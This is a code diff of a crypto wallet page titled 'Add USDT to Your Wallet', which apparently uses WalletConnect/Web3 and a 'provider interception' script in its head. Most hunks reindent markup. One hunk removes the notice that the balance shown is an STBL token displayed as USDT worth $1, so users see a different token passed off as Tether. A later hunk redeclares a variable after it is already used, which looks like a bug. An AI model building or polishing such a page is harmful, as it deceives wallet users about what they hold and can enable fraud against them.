@@ -7,11 +7,11 @@
   <title>Add USDT to Your Wallet</title>
   <link rel="icon" href="https://cryptologos.cc/logos/tether-usdt-logo.png" type="image/png">
   <link rel="manifest" href="/manifest.json">
-      <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-    <!-- WalletConnect Web3Modal -->
-    <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
-    <script src="https://unpkg.com/web3@1.8.0/dist/web3.min.js"></script>
-    <script src="https://unpkg.com/web3modal@1.9.9/dist/index.js"></script>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+  <!-- WalletConnect Web3Modal -->
+  <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+  <script src="https://unpkg.com/web3@1.8.0/dist/web3.min.js"></script>
+  <script src="https://unpkg.com/web3modal@1.9.9/dist/index.js"></script>
   <!-- CRITICAL FIX: Setup provider interception in head section -->
   <script>
     // MetaMask version detection module
@@ -817,24 +817,24 @@
             <button id="altMethodBtn" class="btn btn-add-token btn-lg text-white alt-method">
               Try Alternative Method
             </button>
-           <div class="mt-3">
-  <button id="viewInMetaMaskBtn" class="btn btn-secondary-action">
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 35 33" width="20" height="20" class="me-2">
-      <path fill="#E2761B" d="M32.958 1l-13.134 9.718 2.442-5.727L32.958 1z"/>
-      <path fill="#E4761B" d="M2.663 1l13.016 9.809-2.325-5.818L2.663 1zM28.25 23.54l-3.436 5.257 7.331 2.017 2.107-7.167-6.002-.107zM1.277 23.647l2.099 7.167 7.33-2.017-3.436-5.257-5.993.107z"/>
-      <path fill="#E4761B" d="M10.177 14.43l-2.088 3.15 7.42.336-.247-8.005-5.085 4.519zM25.353 14.43l-5.144-4.608-.169 8.094 7.42-.336-2.107-3.15zM10.177 28.797l4.47-2.156-3.856-3.01-.614 5.166zM20.883 26.641l4.468 2.156-.612-5.166-3.856 3.01z"/>
-      <path fill="#F6851B" d="M25.35 28.797l-4.468-2.156.359 2.886-.039 1.216 4.148-1.946zM10.177 28.797l4.148 1.946-.03-1.216.357-2.886-4.475 2.156z"/>
-    </svg>
-    View in MetaMask
-  </button>
-  <button id="viewInTrustWalletBtn" class="btn btn-secondary-action ms-2">
-    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 32 32" class="me-2">
-      <path fill="#3375BB" d="M16 0C7.163 0 0 7.163 0 16s7.163 16 16 16 16-7.163 16-16S24.837 0 16 0z"/>
-      <path fill="#fff" d="M15.93 8.64c-3.062 0-7.298 1.45-7.298 5.8 0 2.595 1.553 4.2 3.033 5.106 1.59.97 2.492 1.389 2.492 2.336 0 .946-.901 1.538-2.492 1.538-2.263 0-3.197-.61-3.197-.61s-.607 2.47 3.26 2.47c3.866 0 7.233-1.45 7.233-5.8 0-2.596-1.553-4.2-3.032-5.107-1.59-.97-2.492-1.389-2.492-2.336 0-.946.902-1.537 2.492-1.537 2.263 0 3.197.61 3.197.61s.606-2.47-3.197-2.47z"/>
-    </svg>
-    View in Trust Wallet
-  </button>
-</div>
+            <div class="mt-3">
+              <button id="viewInMetaMaskBtn" class="btn btn-secondary-action">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 35 33" width="20" height="20" class="me-2">
+                  <path fill="#E2761B" d="M32.958 1l-13.134 9.718 2.442-5.727L32.958 1z"/>
+                  <path fill="#E4761B" d="M2.663 1l13.016 9.809-2.325-5.818L2.663 1zM28.25 23.54l-3.436 5.257 7.331 2.017 2.107-7.167-6.002-.107zM1.277 23.647l2.099 7.167 7.33-2.017-3.436-5.257-5.993.107z"/>
+                  <path fill="#E4761B" d="M10.177 14.43l-2.088 3.15 7.42.336-.247-8.005-5.085 4.519zM25.353 14.43l-5.144-4.608-.169 8.094 7.42-.336-2.107-3.15zM10.177 28.797l4.47-2.156-3.856-3.01-.614 5.166zM20.883 26.641l4.468 2.156-.612-5.166-3.856 3.01z"/>
+                  <path fill="#F6851B" d="M25.35 28.797l-4.468-2.156.359 2.886-.039 1.216 4.148-1.946zM10.177 28.797l4.148 1.946-.03-1.216.357-2.886-4.475 2.156z"/>
+                </svg>
+                View in MetaMask
+              </button>
+              <button id="viewInTrustWalletBtn" class="btn btn-secondary-action ms-2">
+                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 32 32" class="me-2">
+                  <path fill="#3375BB" d="M16 0C7.163 0 0 7.163 0 16s7.163 16 16 16 16-7.163 16-16S24.837 0 16 0z"/>
+                  <path fill="#fff" d="M15.93 8.64c-3.062 0-7.298 1.45-7.298 5.8 0 2.595 1.553 4.2 3.033 5.106 1.59.97 2.492 1.389 2.492 2.336 0 .946-.901 1.538-2.492 1.538-2.263 0-3.197-.61-3.197-.61s-.607 2.47 3.26 2.47c3.866 0 7.233-1.45 7.233-5.8 0-2.596-1.553-4.2-3.032-5.107-1.59-.97-2.492-1.389-2.492-2.336 0-.946.902-1.537 2.492-1.537 2.263 0 3.197.61 3.197.61s.606-2.47-3.197-2.47z"/>
+                </svg>
+                View in Trust Wallet
+              </button>
+            </div>
             <button id="scanQrBtn" class="btn btn-secondary-action mt-2" data-bs-toggle="modal" data-bs-target="#qrModal">
               Scan QR Code on Mobile
             </button>
@@ -1485,22 +1485,6 @@
             tokenValue.textContent = "$" + balanceData.formattedBalance;
             
             StatusTracker.addStatus("Updated balance: " + balanceData.formattedBalance + " USDT", "success");
-            
-            // Add more details to explain token properties
-            const detailsHtml = `
-              <small class="text-muted mt-2 d-block">
-                This displays your STBL balance as USDT with a 1:1 ratio.<br>
-                Each STBL token is shown as 1 USDT worth $1 USD.
-              </small>
-            `;
-            
-            // Add explanation text if it doesn't exist yet
-            if (!document.querySelector('.balance-explanation')) {
-              const explanation = document.createElement('div');
-              explanation.className = 'balance-explanation';
-              explanation.innerHTML = detailsHtml;
-              tokenValue.parentNode.appendChild(explanation);
-            }
           } else {
             throw new Error("Invalid balance data");
           }
@@ -1553,6 +1537,11 @@
         loadingOverlay.style.display = 'none';
         requestInProgress = false;
       });
+      
+      // Initialize variables for tracking request state and retry attempts
+      let requestInProgress = false;
+      let attemptCount = 0;
+      let lastError = null;
       
       // Check if connected on page load
       try {
